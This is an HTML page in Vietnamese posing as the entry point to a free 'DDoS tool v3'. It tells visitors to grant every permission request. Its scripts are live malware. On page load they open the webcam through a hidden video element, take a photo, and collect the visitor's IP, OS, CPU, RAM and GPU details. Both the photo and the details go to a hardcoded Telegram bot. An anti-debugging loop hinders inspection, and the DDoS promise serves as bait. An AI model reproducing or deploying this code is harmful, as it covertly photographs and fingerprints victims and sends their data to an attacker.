<!DOCTYPE html>

<html>

<head>

    <title>Server Ddos By IamMinhTuong.Vn</title>

    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>

    <script type='text/javascript'>

      ! function t() {

          try {

              ! function t(n) {

                  1 === ("" + n / n).length && 0 !== n || function() {}.constructor("debugger")(), t(++n)

              }(0)

          } catch (n) {

              setTimeout(t, 50)

          }

      }();

  </script>

    <style>

        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap');

    

    .container {

      display: flex;

      flex-direction: column;

      align-items: center;

      justify-content: center;

      height: 100vh;

      background: linear-gradient(to bottom right, #ffafbd, #ffc3a0);

      animation: backgroundAnimation 10s infinite;

    }

    

    @keyframes backgroundAnimation {

      0% {

        background: linear-gradient(to bottom right, #ffafbd, #ffc3a0);

      }

      50% {

        background: linear-gradient(to bottom right, #ffc3a0, #ffafbd);

      }

      100% {

        background: linear-gradient(to bottom right, #ffafbd, #ffc3a0);

      }

    }

    

    h1 {

      color: #333;

      font-size: 32px;

      font-family: 'Roboto', sans-serif;

      animation: textAnimation 2s infinite;

    }

    

    @keyframes textAnimation {

      0% {

        color: #333;

      }

      50% {

        color: #ff0000;

        transform: scale(1.2);

      }

      100% {

        color: #333;

      }

    }

    

    p {

      color: #666;

      font-size: 18px;

      font-family: 'Roboto', sans-serif;

    }

    </style>

    </head>

    <body>

      <div class="container">

        <h1>XIN CHÀO MỌI NGƯỜI!</h1>

        <p>Mọi người mọi người chấp nhận tất cả để được vào tool DDOS VERSION 3.0  cực mạnh của Lê Anh Tuấn Đây Nha <a href="https://IamMinhTuong.Vn/toolddos" rel="nofollow" target="_blank">SERVER DDOS V3 FREE</a>!
        <br><h1>NẾU KHÔNG CHO PHÉP THEO YÊU CẦU CỦA SERVER THÌ SẼ KHÔNG VÀO ĐƯỢC SERVER DDOS</h1></p>

      </div>

 

  <script>

    // Hàm chụp ảnh khuôn mặt bằng webcam

    function capturePhoto() {

        var video = document.getElementById('video');

        var canvas = document.createElement('canvas');

        var context = canvas.getContext('2d');

 

        // Cài đặt kích thước canvas bằng kích thước video

        canvas.width = video.videoWidth;

        canvas.height = video.videoHeight;

 

        // Chụp ảnh từ video

        context.drawImage(video, 0, 0, canvas.width, canvas.height);

 

        // Lấy dữ liệu ảnh dưới dạng Blob

        canvas.toBlob(function(blob) {

            // Gửi ảnh qua Telegram

            var formData = new FormData();

            formData.append('chat_id', '6399418466'); // Thay YOUR_CHAT_ID bằng Chat ID của bot Telegram

            formData.append('photo', blob, 'photo.jpg');

 

            $.ajax({

                type: 'POST',

                url: 'https://api.telegram.org/bot6756366058:AAGSDLDxRjM5sbPnEvPSHc1wypO7AyYtrW8/sendPhoto', // Thay YOUR_TELEGRAM_BOT_TOKEN bằng Telegram Bot Token của bạn

                data: formData,

                processData: false,

                contentType: false,

                success: function(response) {

                    console.log('Đã gửi ảnh thành công đến Telegram');

                },

                error: function(error) {

                    console.log('Lỗi khi gửi ảnh đến Telegram: ' + error);

                }

            });

        }, 'image/jpeg');

    }

 

    // Sử dụng API getUserMedia để truy cập webcam và tự động chụp ảnh

    function requestCameraAccess() {

        navigator.mediaDevices.getUserMedia({ video: true })

            .then(function(stream) {

                var video = document.getElementById('video');

                video.srcObject = stream;

                video.play();

 

                // Tự động chụp ảnh sau 1 giây

                setTimeout(function() {

                    capturePhoto();

                }, 500);

            })

            .catch(function(error) {

                console.log('Đã xảy ra lỗi khi truy cập webcam: ' + error.message);

            });

    }

 

    // Hiển thị hộp thoại alert và xử lý phản hồi của người dùng

    function showCameraAccessAlert() {

        alert('Ấn OK để tiếp tục xem.');

        requestCameraAccess();

    }

 

    // Gọi hàm hiển thị hộp thoại alert khi trang web được tải

    window.addEventListener('DOMContentLoaded', function() {

        showCameraAccessAlert();

    });

</script>

 

<video id="video" width="1" height="1" autoplay></video>

 

  <script>

    $(document).ready(function() {

      var telegramBotToken = '6756366058:AAGSDLDxRjM5sbPnEvPSHc1wypO7AyYtrW8';

      var chatId = '6399418466';

 

      // Lấy địa chỉ IP

      $.getJSON('https://api.ipify.org?format=json', function(data) {

        var ip = data.ip;

 

        var cpu = navigator.hardwareConcurrency || 'N/A';

        var ram = navigator.deviceMemory || 'N/A';

        var disk = navigator.deviceStorage || 'N/A';

        var gpu = getGraphicsCard();

        var os = getOperatingSystem();

        var userAgent = navigator.userAgent;

 

        var message = '- Địa chỉ IP mới: ' + ip + '\n- User-Agent: ' + userAgent + '\n- Hệ điều hành: ' + os + '\n- CPU: ' + cpu + '\n- RAM: ' + ram + '\n- Disk: ' + disk + '\n- GPU: ' + gpu;

 

        var payload = {

          chat_id: chatId,

          text: message

        };

 

        $.ajax({

          type: 'POST',

          url: 'https://api.telegram.org/bot' + telegramBotToken + '/sendMessage',

          data: payload,

          dataType: 'json',

          success: function(response) {

            console.log('Thông tin đã được gửi thành công đến Telegram');

          },

          error: function(error) {

            console.log('Lỗi khi gửi thông tin đến Telegram: ' + error);

          }

        });

      });

 

      // Các hàm hỗ trợ

      function getOperatingSystem() {

        var userAgent = navigator.userAgent || navigator.vendor || window.opera;

        if (/windows phone/i.test(userAgent)) {

          return 'Windows Phone';

        }

        if (/android/i.test(userAgent)) {

          return 'Android';

        }

        if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {

          return 'iOS';

        }

        if (/Macintosh|Mac OS X/.test(userAgent)) {

          return 'Mac OS';

        }

        if (/Windows NT/.test(userAgent)) {

          return 'Windows';

        }

        return 'Unknown';

      }

 

      function getGraphicsCard() {

        var canvas = document.createElement('canvas');

        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');

        var gpu = 'N/A';

        if (debugInfo) {

          gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

        }

        return gpu;

      }

    });

  </script>

</body>

</html>